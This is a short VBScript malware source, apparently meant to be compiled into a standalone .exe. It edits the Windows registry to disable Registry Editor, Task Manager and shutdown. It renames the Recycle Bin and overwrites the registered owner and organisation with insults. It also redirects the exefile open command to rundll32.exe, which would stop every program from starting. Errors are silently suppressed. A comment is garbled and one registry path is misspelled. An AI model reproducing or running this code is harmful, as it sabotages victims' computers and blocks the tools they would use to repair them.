~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<SCRIPT LANGUAGE=VBScript>

' ----- ExeScript Options Begin -----
' ScriptType: window
' DestDirectory: temp
' Icon: default
' OutputFile: E:\Documents and Settings\paranoja\Desktop\vvvvvv.exe
' ----- ExeScript Options End -----
'            = = = = = =  = > by Coc@INCHIK < = = = = = = = 

'      FFF     (JVAXAXAAXAXAXAXAXAX)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Ïðîïóñêàòü îøèáêè
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")







Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoClose", 1, "REG_DWORD"




on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","lameris sanagve"
s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","lameri"
s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","degeneratka"
s.regwrite"HKCR\exefile\shell\open\command\","rundll32.exe"



</SCRIPT>